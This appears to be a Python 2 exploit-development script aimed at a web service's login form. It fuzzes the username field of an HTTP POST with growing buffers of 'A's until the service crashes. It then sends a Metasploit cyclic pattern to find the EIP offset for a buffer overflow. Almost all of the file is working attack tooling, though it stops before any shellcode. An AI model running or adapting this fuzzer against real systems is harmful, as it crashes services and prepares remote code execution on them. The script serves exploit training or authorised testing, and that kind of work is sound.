#!/usr/bin/python
import socket
import time
import sys
import os
import csv

def fuzzing(bufferloc, sizeFuzzing, host, port):
    if query_yes_no("Do you want start Fuzzing?"):
        print "[+] Start Fuzzing..."
    while (sizeFuzzing < 2000):
        inputBuffer = "A" * sizeFuzzing

        content = "username=" + inputBuffer + "&password=A"
        buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content

        try:
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((host, port))
        except:
            print("\n[!] Could not connect!")
            sys.exit()
        try:
            s.send(buffer)
            print '[+] Sending buffer with the pattern.'
            s.recv(1024)
            s.close()
            print "Fuzzing with {} bytes.".format(len(inputBuffer))
        except:
            print "\nFuzzing crashed at {} bytes".format(len(inputBuffer))
            return len(inputBuffer)
        sizeFuzzing += 100
        time.sleep(5)

def findEIP(bufferloc, lenCrash, host, port):
    print "[+] Creating pattern..."
    stream = os.popen("msf-pattern_create -l {}".format(lenCrash))
    pattern = stream.read().strip()
    inputBuffer = pattern
    content = "username=" + inputBuffer + "&password=A"
    buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    try:
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.send(buffer)
        s.recv(1024)
        s.close()
        print "Fuzzing with {} bytes.".format(len(inputBuffer))
    except:
        print("\nCould not connect!")
        sys.exit()  
    return len(inputBuffer)
    time.sleep(5)

def query_yes_no(question, default="yes"):
    """Ask a yes/no question via raw_input() and return their answer.

    "question" is a string that is presented to the user.
    "default" is the presumed answer if the user just hits <Enter>.
            It must be "yes" (the default), "no" or None (meaning
            an answer is required of the user).

    The "answer" return value is True for "yes" or False for "no".
    """
    valid = {"yes": True, "y": True, "ye": True, "no": False, "n": False}
    if default is None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while True:
        sys.stdout.write(question + prompt)
        choice = raw_input().lower()
        if default is not None and choice == "":
            return valid[default]
        elif choice in valid:
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' " "(or 'y' or 'n').\n")